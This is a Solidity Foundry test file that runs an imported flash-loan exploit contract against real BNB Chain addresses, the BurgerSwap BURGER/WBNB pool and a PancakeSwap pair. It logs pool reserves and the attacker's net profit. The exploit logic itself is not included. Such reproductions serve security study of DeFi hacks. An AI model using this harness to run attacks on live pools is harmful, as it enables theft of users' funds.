// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerFlashExploit.sol";

contract BurgerFlashTest is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;
    address constant PANCAKE_WBNB_BUSD = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;

    BurgerFlashExploit exploit;
    address attacker;

    function test_flashAttack() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        exploit = new BurgerFlashExploit();

        // Check PancakeSwap WBNB/BUSD pair
        (uint112 r0, uint112 r1,) = IPancakePair(PANCAKE_WBNB_BUSD).getReserves();
        address t0 = IPancakePair(PANCAKE_WBNB_BUSD).token0();
        emit log_named_address("token0", t0);
        emit log_named_uint("reserve0", r0);
        emit log_named_uint("reserve1", r1);

        // Check BURGER/WBNB pool
        address burgerPair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (uint112 br0, uint112 br1,) = IDemaxPair(burgerPair).getReserves();
        emit log_named_uint("BurgerSwap BURGER reserve", br0);
        emit log_named_uint("BurgerSwap WBNB reserve", br1);

        // Flash attack with 2000 WBNB
        emit log("--- Starting flash attack ---");
        exploit.attack(2000 ether);

        // Check result
        uint256 wbnbBal = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("Exploit WBNB balance after", wbnbBal);

        // Withdraw
        exploit.withdraw();
        emit log_named_uint("Attacker BNB balance", attacker.balance);
        emit log_named_int("Net profit BNB", int256(attacker.balance) - 1 ether);

        vm.stopPrank();
    }

    function test_directAttack() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2500 ether);
        vm.startPrank(attacker);
        exploit = new BurgerFlashExploit();

        // Wrap BNB to WBNB
        IWBNB(WBNB).deposit{value: 2000 ether}();
        IWBNB(WBNB).transfer(address(exploit), 2000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB before", wbnbBefore);

        exploit.attackDirect(1800 ether);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_int("WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));

        // Check BURGER/WBNB pool after attack
        address burgerPair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (uint112 br0, uint112 br1,) = IDemaxPair(burgerPair).getReserves();
        emit log_named_uint("BurgerSwap BURGER reserve after", br0);
        emit log_named_uint("BurgerSwap WBNB reserve after", br1);

        vm.stopPrank();
    }
}
